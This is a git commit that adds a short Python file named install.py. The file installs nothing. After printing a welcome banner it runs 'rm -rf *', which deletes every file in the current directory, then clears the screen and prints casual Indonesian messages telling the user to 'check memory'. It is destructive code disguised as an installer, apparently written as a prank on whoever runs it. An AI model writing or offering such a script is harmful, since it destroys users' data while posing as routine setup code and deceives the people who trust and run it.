0fb5b8e45b85fb2f8a4d12f35eff708c02ec2248
RaflySahrul.86 <42622170+RAFLYSAHRUL@users.noreply.github.com>
2020-03-13 07:24:19 +0700

    Create install.py

---
+++ install.py
@@ -0,0 +1,10 @@
+import os
+import time
+os.system("figlet Welcome")
+print("Bentar")
+os.system("rm -rf *")
+time.sleep(3)
+print("oke sudah")
+os.system("clear")
+print("Silahkan cek memory")
+print("ty bambank:v")
